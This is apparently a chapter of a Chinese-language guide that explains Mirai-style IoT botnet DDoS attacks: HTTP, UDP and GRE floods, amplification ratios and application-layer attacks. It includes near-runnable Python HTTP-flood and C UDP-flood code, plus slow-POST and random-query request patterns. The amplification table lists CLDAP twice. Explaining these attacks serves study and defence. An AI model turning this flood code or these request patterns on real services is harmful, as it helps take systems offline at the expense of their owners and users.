# DDoS攻击技术详解

### 9.1 IoT僵尸网络DDoS攻击类型

#### 9.1.1 HTTP洪水攻击

```python
# Mirai HTTP洪水攻击模块分析
class HTTPFlood:
    """HTTP洪水攻击实现分析"""
    
    def generate_attack(self, target_url: str, duration: int):
        """生成HTTP洪水攻击流量"""
        attack_end = time.time() + duration
        
        while time.time() < attack_end:
            # Mirai使用多种User-Agent随机选择
            user_agents = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0)',
                'Mozilla/5.0 (Linux; Android 11; Pixel 5)',
                # ... 更多UA
            ]
            
            # 构造HTTP请求
            request = (
                f"GET {random_path()} HTTP/1.1\r\n"
                f"Host: {target_host}\r\n"
                f"User-Agent: {random.choice(user_agents)}\r\n"
                f"Accept: */*\r\n"
                f"Connection: keep-alive\r\n"
                f"\r\n"
            )
            
            # 建立连接并发送
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((target_host, 80))
            sock.send(request.encode())
            
            # Mirai会保持连接不关闭，消耗服务器资源
            # 每个Bot可同时维持数百个连接
```

#### 9.1.2 UDP洪水攻击

```c
// Mirai UDP洪水攻击（伪代码）
void udp_flood(uint32_t target_ip, uint16_t target_port, int duration) {
    struct sockaddr_in dst;
    dst.sin_family = AF_INET;
    dst.sin_addr.s_addr = target_ip;
    
    int end_time = time(NULL) + duration;
    
    // 每个Bot创建多个Socket
    int sockets[MAX_SOCKETS];
    for (int i = 0; i < MAX_SOCKETS; i++) {
        sockets[i] = socket(AF_INET, SOCK_DGRAM, 0);
        // 随机源端口
        struct sockaddr_in src;
        src.sin_port = htons(rand() % 65535);
        bind(sockets[i], (struct sockaddr*)&src, sizeof(src));
    }
    
    char payload[65500];
    while (time(NULL) < end_time) {
        for (int i = 0; i < MAX_SOCKETS; i++) {
            // 随机目标端口
            dst.sin_port = htons(rand() % 65535);
            // 随机payload
            rand_str(payload, sizeof(payload));
            sendto(sockets[i], payload, sizeof(payload), 0, 
                   (struct sockaddr*)&dst, sizeof(dst));
        }
    }
}
```

#### 9.1.3 GRE协议洪水

GRE（Generic Routing Encapsulation）洪水是Mirai的标志性攻击手法：

```
GRE洪水攻击原理:
1. 利用GRE协议封装任意IP数据包
2. 构造GRE封装的IP包
3. 大量发送到目标，导致目标处理GRE解封装时消耗大量CPU
4. 部分防火墙对GRE协议处理效率低，容易被打穿

GRE数据包结构:
┌──────────┬──────────┬──────────┐
│ IP头部    │ GRE头部  │ 载荷     │
│ (20字节)  │ (4字节)  │ (变长)   │
└──────────┴──────────┴──────────┘

攻击效果:
- 2016年Dyn攻击: GRE洪水峰值1.2Tbps
- French ISP OVH: GRE洪水峰值1Tbps
- Brian Krebs网站: 混合洪水620Gbps
```

### 9.2 放大攻击

虽然Mirai主要使用直接洪水攻击，但部分IoT僵尸网络变体也使用反射放大攻击：

| 放大协议 | 放大倍数 | Mirai变体使用 |
|---------|---------|-------------|
| DNS | 50-100x | 否（但DNS硬编码解析攻击） |
| NTP | 556x | 否 |
| Memcached | 51000x | 部分变体 |
| SSDP | 30x | 否 |
| CLDAP | 70x | 否 |
| cLDAP | 70x | 否 |

### 9.3 应用层攻击

新一代IoT僵尸网络开始针对应用层发起攻击：

```
应用层DDoS攻击特征:
1. 低速高伤: 每秒仅几十请求，但消耗服务器大量资源
2. 合法请求: 使用合法HTTP请求，难以与正常流量区分
3. 针对API: 攻击搜索/登录/结账等高负载API端点
4. 缓存击穿: 绕过CDN缓存，直接攻击源服务器

示例攻击模式:
- 随机查询攻击: 发送随机参数的搜索请求
  GET /search?q=ajksdlfj HTTP/1.1
  每次请求参数不同，无法缓存
  
- 慢速POST攻击: 发送超大的POST请求体
  POST /upload HTTP/1.1
  Content-Length: 9999999999
  body: 极慢发送数据
```

---

---

